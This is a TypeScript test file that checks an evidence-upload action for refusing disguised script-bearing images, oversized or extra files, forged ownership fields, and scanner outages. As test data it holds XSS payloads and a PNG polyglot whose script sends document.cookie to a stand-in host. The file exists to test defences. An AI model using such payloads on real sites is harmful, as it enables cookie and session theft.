// @vitest-environment node
// Adversarial tests (demo slice, plan Step 13): try to slip a disguised, oversized or extra file
// past the upload action, attach to someone else's experience, or get a file counted while
// ClamAV is unreachable. The scanner is NOT mocked: a stand-in clamd on a local port (or no
// listener at all) talks to the real INSTREAM client, so fail-closed is proven end to end.
import type {
  DemoCurrentAccount,
  DemoOwnEvidenceRow,
  DemoReviewEditRow,
  EvidenceState,
} from '@rogikotha/contracts';
import { randomBytes } from 'node:crypto';
import { existsSync } from 'node:fs';
import { mkdtemp, readdir, rm } from 'node:fs/promises';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { getCurrentAccount } from '@/server/auth/session';
import { encrypt } from '@/server/crypto';
import { runCommand } from '@/server/command-call';
import type * as Container from '@/server/container';
import { evidence, reviews } from '@/server/data';
import { listOwnEvidenceFiles, uploadEvidence, type EvidenceUploadState } from './evidence';

const evidenceModule = vi.hoisted(() => ({ getForAuthor: { name: 'evidence.getForAuthor' } }));

vi.mock('@/server/command-call', () => ({ runCommand: vi.fn() }));
// `server/crypto.ts` still builds its column cipher through the real container module.
vi.mock('@/server/container', async (importOriginal) => ({
  ...(await importOriginal<typeof Container>()),
  getContainer: () => ({ evidence: evidenceModule }),
}));
vi.mock('next/cache', () => ({ revalidatePath: vi.fn() }));
vi.mock('@/server/auth/session', () => ({ getCurrentAccount: vi.fn() }));
vi.mock('@/server/data', () => ({
  reviews: { getOwnReviewForEdit: vi.fn() },
  evidence: {
    addEvidenceItem: vi.fn(),
    markScanResult: vi.fn(),
    listOwnEvidence: vi.fn(),
  },
}));

const IDLE: EvidenceUploadState = { status: 'idle' };
const OWNER_ID = '0190f5a2-0000-7000-8000-00000000a001';
const STRANGER_ID = '0190f5a2-0000-7000-8000-00000000a002';
const VICTIM_REVIEW_PUBLIC_ID = 'v1ct1mr3v1';
const VICTIM_REVIEW_ID = '0190f5a2-0000-7000-8000-00000000b001';
const PNG_SIGNATURE = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
const PNG_BYTES = Uint8Array.from([...PNG_SIGNATURE, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52]);

function buildAccount(accountId: string, username: string): DemoCurrentAccount {
  return {
    accountId,
    authUserId: `auth-${username}`,
    username,
    displayName: `Synthetic ${username}`,
    locale: 'en',
    status: 'active',
    currentPersonaId: '0190f5a2-0000-7000-8000-0000000000aa',
    pseudonymousPersonaId: null,
    pseudonymousDisplayName: null,
  };
}

function buildVictimReview(): DemoReviewEditRow {
  return {
    id: VICTIM_REVIEW_ID,
    publicId: VICTIM_REVIEW_PUBLIC_ID,
    doctorId: '0190f5a2-0000-7000-8000-00000000d001',
    title: 'A synthetic visit',
    body: 'Synthetic body',
    sentiment: null,
    outcome: null,
    version: 1,
  };
}

function buildOwnRow(state: EvidenceState): DemoOwnEvidenceRow {
  return {
    id: randomBytes(8).toString('hex'),
    publicId: randomBytes(5).toString('hex'),
    state,
    mime: 'image/png',
    size: 2048,
    originalFilenameEnc: encrypt('scan.png'),
    createdAt: new Date('2026-10-30T09:00:00Z'),
  };
}

/** Raw bytes followed by UTF-8 text, so a binary signature is not re-encoded as text. */
function bytes(head: number[], text: string): Uint8Array<ArrayBuffer> {
  return Uint8Array.from([...head, ...new TextEncoder().encode(text)]);
}

function file(content: BlobPart, name: string, type = 'image/png'): File {
  return new File([content], name, { type });
}

function buildForm(files: File[], extra: Record<string, string> = {}): FormData {
  const form = new FormData();
  form.set('reviewPublicId', VICTIM_REVIEW_PUBLIC_ID);
  for (const f of files) form.append('file', f);
  for (const [key, value] of Object.entries(extra)) form.set(key, value);
  return form;
}

interface FakeClamd {
  port: number;
  connections: () => number;
  received: () => Buffer;
  close: () => Promise<void>;
}

/**
 * A clamd stand-in. `reply` gets the streamed bytes and returns clamd's answer, or null to drop
 * the connection without answering.
 */
async function startFakeClamd(reply: (payload: Buffer) => string | null): Promise<FakeClamd> {
  let connections = 0;
  const payload: Buffer[] = [];
  const sockets = new Set<net.Socket>();
  const server = net.createServer((socket) => {
    connections += 1;
    sockets.add(socket);
    let buffer = Buffer.alloc(0);
    let commandRead = false;
    socket.on('error', () => {});
    socket.on('data', (data: Buffer) => {
      buffer = Buffer.concat([buffer, data]);
      if (!commandRead) {
        const end = buffer.indexOf(0);
        if (end < 0) return;
        buffer = buffer.subarray(end + 1);
        commandRead = true;
      }
      while (buffer.length >= 4) {
        const length = buffer.readUInt32BE(0);
        if (length === 0) {
          const answer = reply(Buffer.concat(payload));
          if (answer === null) socket.destroy();
          else socket.end(`${answer}\0`);
          return;
        }
        if (buffer.length < 4 + length) return;
        payload.push(buffer.subarray(4, 4 + length));
        buffer = buffer.subarray(4 + length);
      }
    });
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  return {
    port: (server.address() as net.AddressInfo).port,
    connections: () => connections,
    received: () => Buffer.concat(payload),
    close: () =>
      new Promise((resolve) => {
        for (const socket of sockets) socket.destroy();
        server.close(() => resolve());
      }),
  };
}

async function closedPort(): Promise<number> {
  const server = net.createServer();
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address() as net.AddressInfo;
  await new Promise<void>((resolve) => server.close(() => resolve()));
  return port;
}

function pointScannerAt(port: number): void {
  process.env.CLAMD_HOST = '127.0.0.1';
  process.env.CLAMD_PORT = String(port);
}

let dir: string;
let clamd: FakeClamd | undefined;
const ENV_KEYS = [
  'APP_ENCRYPTION_KEY',
  'EVIDENCE_STORAGE_DIR',
  'CLAMD_HOST',
  'CLAMD_PORT',
] as const;
const savedEnv = Object.fromEntries(ENV_KEYS.map((key) => [key, process.env[key]]));

async function storedKeys(): Promise<string[]> {
  return existsSync(dir) ? readdir(dir) : [];
}

function scanResultsRecorded(): string[] {
  return vi.mocked(evidence.markScanResult).mock.calls.map(([, result]) => result);
}

beforeEach(async () => {
  vi.clearAllMocks();
  process.env.APP_ENCRYPTION_KEY = randomBytes(32).toString('base64');
  const tmp = await mkdtemp(path.join(os.tmpdir(), 'rk-evidence-adversarial-'));
  dir = path.join(tmp, 'evidence');
  process.env.EVIDENCE_STORAGE_DIR = dir;
  // A scanner that passes everything: any refusal below must come from the upload checks.
  clamd = await startFakeClamd(() => 'stream: OK');
  pointScannerAt(clamd.port);
  vi.mocked(getCurrentAccount).mockResolvedValue(buildAccount(OWNER_ID, 'owner_rina'));
  // Ownership as the data layer decides it: only the owner's account gets the review back.
  vi.mocked(reviews.getOwnReviewForEdit).mockImplementation((publicId, accountId) =>
    Promise.resolve(
      publicId === VICTIM_REVIEW_PUBLIC_ID && accountId === OWNER_ID ? buildVictimReview() : null,
    ),
  );
  vi.mocked(evidence.listOwnEvidence).mockResolvedValue([]);
  vi.mocked(evidence.addEvidenceItem).mockResolvedValue({ id: 'item-1', publicId: 'e1e1e1e1e1' });
  vi.mocked(evidence.markScanResult).mockResolvedValue();
  vi.spyOn(console, 'error').mockImplementation(() => {});
});

afterEach(async () => {
  await clamd?.close();
  clamd = undefined;
  for (const key of ENV_KEYS) {
    if (savedEnv[key] === undefined) delete process.env[key];
    else process.env[key] = savedEnv[key];
  }
  await rm(path.dirname(dir), { recursive: true, force: true });
  vi.restoreAllMocks();
});

describe('a disguised file', () => {
  it.each([
    [
      'an SVG with a script, renamed .png',
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    ],
    ['an XML-declared SVG, renamed .png', '<?xml version="1.0"?><svg onload="alert(1)"/>'],
    ['an HTML page, renamed .png', '<!doctype html><html><script>fetch("/x")</script></html>'],
    ['an HTML page with a byte-order mark, renamed .jpg', bytes([0xef, 0xbb, 0xbf], '<html>')],
    ['a PNG signature cut one byte short, then HTML', bytes(PNG_SIGNATURE.slice(0, 7), '<html>')],
    ['a JPEG start marker cut short, then a script', bytes([0xff, 0xd8], '<script>1</script>')],
  ])('is refused before it is stored or scanned: %s', async (_label, content) => {
    const result = await uploadEvidence(IDLE, buildForm([file(content, 'photo.png')]));

    expect(result).toEqual({ status: 'error', messageKey: 'errors.evidence.typeRejected' });
    expect(await storedKeys()).toEqual([]);
    expect(evidence.addEvidenceItem).not.toHaveBeenCalled();
    expect(clamd!.connections()).toBe(0);
  });

  it('a script behind a real PNG signature reaches the scanner whole, and once flagged leaves no file and is never ready', async () => {
    // ASSUMPTION(demo-slice): the slice checks only the signature (NFR3), so this polyglot can pass
    // the type check; the scanner is then the line of defence and must see every byte of it.
    await clamd!.close();
    clamd = await startFakeClamd((payload) =>
      payload.includes('<script>') ? 'stream: Html.Script.Synthetic FOUND' : 'stream: OK',
    );
    pointScannerAt(clamd.port);
    const polyglot = bytes(
      PNG_SIGNATURE,
      '<html><script>document.location="//x.test/"+document.cookie</script></html>',
    );

    const result = await uploadEvidence(IDLE, buildForm([file(polyglot, 'scan.png')]));

    expect(result).not.toMatchObject({ scan: 'clean' });
    expect(scanResultsRecorded()).not.toContain('clean');
    expect(await storedKeys()).toEqual([]);
    if (clamd.connections() > 0) expect(clamd.received().equals(polyglot)).toBe(true);
  });

  it('the browser-declared type and extension never decide: an image/png HTML page is refused', async () => {
    const result = await uploadEvidence(
      IDLE,
      buildForm([file('<html></html>', 'x-ray.PNG', 'image/png')]),
    );
    expect(result).toEqual({ status: 'error', messageKey: 'errors.evidence.typeRejected' });
  });
});

describe('the size and count limits', () => {
  it('an oversize PNG is refused before anything reaches disk or the scanner', async () => {
    const big = new Uint8Array(10 * 1024 * 1024 + 1);
    big.set(PNG_BYTES);

    const result = await uploadEvidence(IDLE, buildForm([file(big, 'small.png')]));

    expect(result).toEqual({ status: 'error', messageKey: 'ev.upload.errors.tooLarge' });
    expect(await storedKeys()).toEqual([]);
    expect(clamd!.connections()).toBe(0);
  });

  it('a sixth file is refused while five earlier uploads still wait quarantined for a scanner outage', async () => {
    vi.mocked(evidence.listOwnEvidence).mockResolvedValue(
      Array.from({ length: 5 }, () => buildOwnRow('quarantined')),
    );

    const result = await uploadEvidence(IDLE, buildForm([file(PNG_BYTES, 'sixth.png')]));

    expect(result).toEqual({ status: 'error', messageKey: 'ev.upload.errors.tooMany' });
    expect(await storedKeys()).toEqual([]);
    expect(clamd!.connections()).toBe(0);
  });

  it('a sixth file is refused when the five are a mix of seeded, ready, pending and failed files', async () => {
    vi.mocked(evidence.listOwnEvidence).mockResolvedValue([
      buildOwnRow('published'),
      buildOwnRow('preview_ready'),
      buildOwnRow('quarantined'),
      buildOwnRow('failed'),
      buildOwnRow('rejected'),
      buildOwnRow('preview_ready'),
    ]);

    const result = await uploadEvidence(IDLE, buildForm([file(PNG_BYTES, 'sixth.png')]));

    expect(result).toEqual({ status: 'error', messageKey: 'ev.upload.errors.tooMany' });
    expect(evidence.addEvidenceItem).not.toHaveBeenCalled();
  });

  it('one request carrying several files stores at most one, so the fifth slot cannot overflow', async () => {
    vi.mocked(evidence.listOwnEvidence).mockResolvedValue(
      Array.from({ length: 4 }, () => buildOwnRow('preview_ready')),
    );

    await uploadEvidence(
      IDLE,
      buildForm([file(PNG_BYTES, 'a.png'), file(PNG_BYTES, 'b.png'), file(PNG_BYTES, 'c.png')]),
    );

    expect(await storedKeys()).toHaveLength(1);
    expect(evidence.addEvidenceItem).toHaveBeenCalledTimes(1);
  });
});

describe("someone else's experience", () => {
  it('a signed-in stranger cannot attach to it, even with forged owner and review ids in the form', async () => {
    vi.mocked(getCurrentAccount).mockResolvedValue(buildAccount(STRANGER_ID, 'stranger_tuli'));

    const result = await uploadEvidence(
      IDLE,
      buildForm([file(PNG_BYTES, 'planted.png')], {
        accountId: OWNER_ID,
        ownerAccountId: OWNER_ID,
        reviewId: VICTIM_REVIEW_ID,
      }),
    );

    expect(result).toEqual({ status: 'error', messageKey: 'ev.upload.errors.notFound' });
    expect(await storedKeys()).toEqual([]);
    expect(evidence.addEvidenceItem).not.toHaveBeenCalled();
    expect(clamd!.connections()).toBe(0);
  });

  // U48: the list goes through `evidence.getForAuthor`, whose authorship check is tested in the
  // module (evidence-author.test.ts); here the action may hand it nothing but the review id.
  it("a signed-in stranger cannot list the author's files", async () => {
    vi.mocked(getCurrentAccount).mockResolvedValue(buildAccount(STRANGER_ID, 'stranger_tuli'));
    vi.mocked(evidence.listOwnEvidence).mockResolvedValue([buildOwnRow('preview_ready')]);
    vi.mocked(runCommand).mockResolvedValue({
      ok: false,
      error: { code: 'not_found', messageKey: 'errors.common.notFound', correlationId: 'c' },
    } as never);

    await expect(listOwnEvidenceFiles(VICTIM_REVIEW_PUBLIC_ID)).resolves.toBeNull();
    expect(vi.mocked(runCommand).mock.calls).toEqual([
      [evidenceModule.getForAuthor, { reviewPublicId: VICTIM_REVIEW_PUBLIC_ID }],
    ]);
    expect(evidence.listOwnEvidence).not.toHaveBeenCalled();
  });

  it('the owner cannot record the upload under another account by forging form fields', async () => {
    await uploadEvidence(
      IDLE,
      buildForm([file(PNG_BYTES, 'mine.png')], {
        ownerAccountId: STRANGER_ID,
        accountId: STRANGER_ID,
        reviewId: '0190f5a2-0000-7000-8000-00000000b999',
      }),
    );

    expect(evidence.addEvidenceItem).toHaveBeenCalledWith(
      expect.objectContaining({ ownerAccountId: OWNER_ID, reviewId: VICTIM_REVIEW_ID }),
    );
  });
});

describe('ClamAV unreachable or misbehaving', () => {
  it('nothing listening on the scanner port leaves the file quarantined, never marked clean', async () => {
    pointScannerAt(await closedPort());

    const result = await uploadEvidence(IDLE, buildForm([file(PNG_BYTES, 'xray.png')]));

    expect(result).toEqual({
      status: 'uploaded',
      scan: 'error',
      messageKey: 'ev.upload.done.pending',
    });
    expect(scanResultsRecorded()).toEqual(['error']);
    // The original is kept quarantined for a later scan, not served and not counted.
    expect(await storedKeys()).toHaveLength(1);
  }, 20_000);

  it.each([
    ['drops the connection without answering', null],
    ['answers with an error', 'INSTREAM size limit exceeded. ERROR'],
    ['answers OK for another stream name', 'other: OK'],
    ['answers OK with trailing junk', 'stream: OKAY'],
    ['answers with an empty reply', ''],
  ])('a scanner that %s never makes the file ready', async (_label, reply) => {
    await clamd!.close();
    clamd = await startFakeClamd(() => reply);
    pointScannerAt(clamd.port);

    const result = await uploadEvidence(IDLE, buildForm([file(PNG_BYTES, 'xray.png')]));

    expect(result).toMatchObject({ status: 'uploaded', scan: 'error' });
    expect(scanResultsRecorded()).toEqual(['error']);
  });

  it('a scanner on a malformed port is treated as unreachable, not as clean', async () => {
    process.env.CLAMD_PORT = 'not-a-port';

    const result = await uploadEvidence(IDLE, buildForm([file(PNG_BYTES, 'xray.png')]));

    expect(result).toMatchObject({ status: 'uploaded', scan: 'error' });
    expect(scanResultsRecorded()).toEqual(['error']);
  });
});
